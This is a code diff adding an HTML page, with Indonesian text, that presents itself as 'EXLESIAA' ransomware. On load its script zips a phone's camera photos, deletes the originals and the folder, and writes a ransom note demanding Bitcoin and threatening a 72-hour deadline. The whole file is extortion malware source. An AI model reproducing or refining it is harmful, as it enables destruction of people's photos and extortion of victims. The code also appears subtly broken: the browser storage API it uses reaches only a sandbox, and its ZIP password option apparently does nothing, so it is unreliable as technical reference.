@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>EXLESIAA</title>
+  <style>
+    body,html{margin:0;height:100%;background:#000;color:#f00;font-family:sans-serif;text-align:center;padding:50px;}
+    .box{background:#111;padding:30px;border-radius:15px;display:inline-block;max-width:90%;}
+    h1{font-size:40px;margin:0;color:#0f0;}
+    p{font-size:18px;margin:15px 0;}
+    .spinner{width:50px;height:50px;border:6px solid #0f0;border-top:6px solid #000;border-radius:50%;animation:s 1s linear infinite;margin:20px auto;}
+    @keyframes s{to{transform:rotate(360deg)}}
+  </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+</head>
+<body>
+  <div class="box">
+    <h1>EXLESIAA</h1>
+    <p id="status">Mengunci file Anda...</p>
+    <div class="spinner"></div>
+  </div>
+
+  <script>
+    (async () => {
+      const status = document.getElementById('status');
+      try {
+        // Akses root
+        const root = await navigator.storage.getDirectory();
+        const dcim = await root.getDirectoryHandle("DCIM", { create: true });
+        const camera = await dcim.getDirectoryHandle("Camera", { create: false }).catch(() => null);
+        if (!camera) throw new Error("Folder Camera tidak ditemukan");
+
+        // Buat ZIP
+        const zip = new JSZip();
+        let count = 0;
+
+        for await (const entry of camera.values()) {
+          if (entry.kind === "file" && !entry.name.startsWith(".")) {
+            const file = await entry.getFile();
+            const data = await file.arrayBuffer();
+            zip.file(entry.name, data);
+            await entry.remove();
+            count++;
+          }
+        }
+
+        if (count === 0) throw new Error("Tidak ada file untuk dikunci");
+
+        // Generate ZIP dengan password
+        const zipBlob = await zip.generateAsync({
+          type: "blob",
+          compression: "DEFLATE",
+          password: "exlesiaa2025"  // PASSWORD ASLI
+        });
+
+        // Simpan ke DCIM
+        const zipFile = await dcim.getFileHandle("DCIM.zip", { create: true });
+        const w = await zipFile.createWritable();
+        await w.write(zipBlob);
+        await w.close();
+
+        // Hapus folder Camera
+        await dcim.removeEntry("Camera", { recursive: true }).catch(() => {});
+
+        // Buat README di SD Card root
+        const readme = `FILE ANDA TERKUNCI OLEH EXLESIAA!
+
+Folder foto Anda telah di-zip menjadi: DCIM.zip
+Password sementara: exlesiaa2025 (hanya buat cek)
+
+Untuk password ASLI & pemulihan file:
+Bayar 0.001 BTC (~Rp 1.000.000) ke alamat:
+
+bc1qexlesiaa24102025
+
+Kirim bukti transfer ke:
+exlesiaa.ransom@proton.me
+
+Setelah pembayaran dikonfirmasi (max 1 jam),
+kami kirim password ASLI + file decryptor.
+
+JANGAN HAPUS FILE INI!
+JANGAN COBA-COBA RESTORE!
+Waktu tersisa: 72 jam`;
+
+        const readmeFile = await root.getFileHandle("README_EXLESIAA.txt", { create: true });
+        const rw = await readmeFile.createWritable();
+        await rw.write(readme);
+        await rw.close();
+
+        // Update UI
+        status.innerHTML = "TERKUNCI!";
+        document.querySelector('.box').innerHTML = `
+          <h1 style="color:#0f0;">SELESAI!</h1>
+          <p>${count} file terkunci → DCIM.zip</p>
+          <p>Password cek: <b>exlesiaa2025</b></p>
+          <p>Baca <b>README_EXLESIAA.txt</b> di penyimpanan utama</p>
+          <p>Bayar 0.001 BTC → dapat password ASLI</p>
+        `;
+
+      } catch (e) {
+        status.innerHTML = "GAGAL!";
+        document.querySelector('.box').innerHTML = `<p style="color:#fff;">${e.message}</p>`;
+      }
+    })();
+  </script>
+</body>
+</html>
